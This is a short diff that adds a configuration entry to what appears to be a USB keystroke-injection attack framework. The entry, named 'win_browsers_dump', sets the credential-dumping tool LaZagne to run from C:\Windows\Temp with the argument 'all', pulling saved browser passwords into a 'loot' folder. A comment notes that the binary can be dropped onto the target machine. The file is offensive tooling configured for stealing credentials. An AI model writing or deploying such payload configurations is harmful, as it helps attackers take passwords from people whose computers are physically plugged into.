@@ -1,0 +1,8 @@
+name: win_browsers_dump
+group: hid
+summary: Run external browser creds dumper and save to loot
+script: payloads/hid/win_browsers_dump.py
+env:
+  BROWSER_TOOL: "C:\\Windows\\Temp\\LaZagne.exe"   # point at your binary (MSD or dropped)
+  BROWSER_ARGS: "all"
+  LOOT_DIR: "C:\\Windows\\Temp"
